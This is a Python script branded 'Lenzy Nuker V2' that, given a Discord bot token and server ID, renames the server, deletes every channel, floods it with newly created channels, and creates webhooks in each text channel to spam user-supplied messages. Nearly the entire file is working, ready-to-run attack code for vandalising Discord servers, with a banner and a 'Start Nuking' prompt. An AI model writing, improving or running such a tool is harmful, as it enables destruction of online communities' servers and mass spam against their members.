import asyncio
import aiohttp
import os
import time
from datetime import datetime
from pystyle import Colors, Colorate, Center


async def change_server_name(session):
    new_name = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter New Server Name >> "))
    async with session.patch(
        f'https://discord.com/api/v9/guilds/{guild_id}',
        headers=headers,
        json={"name": new_name},
    ) as r:
        if r.status in [200, 201, 204]:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Server name changed Successfully to >> [{new_name}]"))
        elif r.status == 429:
            print(Colorate.Horizontal(Colors.red_to_white, " [$] Rate-limited while changing server name. Retrying soon..."))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to change server name. Status code: {r.status}"))
    await asyncio.sleep(1)  # Short delay for a smooth flow

async def delete_channels(session):
    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as r:
        channels = await r.json()

    for channel in channels:
        channel_id = channel['id']
        while True:
            try:
                async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:
                    if r.status == 429:
                        print(Colorate.Horizontal(Colors.red_to_white, f" [$] You got rate-limited. Retrying soon >> {channel_id}"))
                        await asyncio.sleep(5)  # Handle rate limits
                    elif r.status in [200, 201, 204]:
                        print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Channel successfully deleted >> {channel_id}"))
                        break
                    else:
                        print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to delete channel >> {channel_id} (Status: {r.status})"))
                        break
            except Exception as e:
                print(f" [$] Couldn't delete channel {channel_id}. Exception: {e}")
                break

async def create_channels(session):
    channel_name = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Channel Name >> "))
    num_channels = int(input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Number of Channels to Create >> ")))
    
    for _ in range(num_channels):
        while True:
            try:
                async with session.post(
                    f'https://discord.com/api/v9/guilds/{guild_id}/channels',
                    headers=headers,
                    json={'name': channel_name, 'type': 0},
                ) as r:
                    if r.status == 429:
                        print(Colorate.Horizontal(Colors.red_to_white, f" [$] You got rate-limited. Retrying soon >> {guild_id}"))
                        await asyncio.sleep(3)  # Handle rate limits
                    elif r.status in [200, 201, 204]:
                        print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Channel successfully created >> {guild_id}"))
                        break
                    else:
                        print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to create channel (Status: {r.status})"))
                        break
            except Exception as e:
                print(f" [$] Couldn't create channel in {guild_id}. Exception: {e}")
                break

async def WebhookSpam(session):
    webhook_name = "RIP"
    msg = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Message to Spam >> "))
    msg_amt = int(input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Number of Messages >> ")))

    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as r:
        channels = await r.json()
        spam_tasks = []  

        for channel in channels:
            if channel['type'] == 0:  
                try:
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{channel["id"]}/webhooks',
                        headers=headers,
                        json={'name': webhook_name},
                    ) as r:
                        if r.status == 429:
                            print(Colorate.Horizontal(Colors.red_to_white, " [$] You got rate-limited. Retrying soon..."))
                            await asyncio.sleep(5)
                        elif r.status in [200, 201, 204]:
                            webhook_raw = await r.json()
                            webhook_url = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                            print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Webhook created successfully >> {webhook_name} for {channel['name']}"))
                            spam_tasks.append(send_message(webhook_url, msg, msg_amt))
                        else:
                            print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to create webhook (Status: {r.status})"))
                except Exception as e:
                    print(f" [$] Exception occurred while creating webhook: {e}")
        await asyncio.gather(*spam_tasks)

async def send_message(hook, message, amount: int):
    async with aiohttp.ClientSession() as session:
        for _ in range(amount):
            await session.post(hook, json={'content': message, 'tts': False})
            await asyncio.sleep(0.1)

async def main():
    global headers, guild_id
    token = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Your Bot Token > "))
    guild_id = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Your Guild ID > "))
    name = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Your Username > "))

    os.system(f'title ^| • Lenzy Nuker V2 ^| User: {name} ^|')
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    os.system('cls' if os.name == 'nt' else 'clear')

    while True:
        print(Colorate.Horizontal(Colors.blue_to_cyan,(r"""
              
▓█████▄  ██▀███   ██▓ ██▓▒███████▒▒███████▒▓██   ██▓▓██   ██▓    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▒██▀ ██▌▓██ ▒ ██▒▓██▒▓██▒▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒ ▒██  ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░██   █▌▓██ ░▄█ ▒▒██▒▒██▒░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░  ▒██ ██░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█▄   ▌▒██▀▀█▄  ░██░░██░  ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ░ ▐██▓░   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒████▓ ░██▓ ▒██▒░██░░██░▒███████▒▒███████▒  ░ ██▒▓░  ░ ██▒▓░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░▓  ░▓  ░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒    ██▒▒▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ▒  ▒   ░▒ ░ ▒░ ▒ ░ ▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░  ▓██ ░▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░  ░   ░░   ░  ▒ ░ ▒ ░░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░   ▒ ▒ ░░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
   ░       ░      ░   ░    ░ ░      ░ ░     ░ ░      ░ ░                 ░    ░     ░  ░      ░  ░   ░     
 ░                       ░        ░         ░ ░      ░ ░                                                   
                                            
                                            Version:2.0 
                                                                                """)))
        input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Press Enter To Start Nuking > "))

        async with aiohttp.ClientSession() as session:
            await change_server_name(session)
            await delete_channels(session)
            await create_channels(session)
            await WebhookSpam(session)

        print(Colorate.Horizontal(Colors.green_to_cyan, " [$] Nuke Completed! Restraing ..."))
        time.sleep(5)
        os.system('cls' if os.name == 'nt' else 'clear')

asyncio.run(main())

os.system('title Driizzyy Nuker')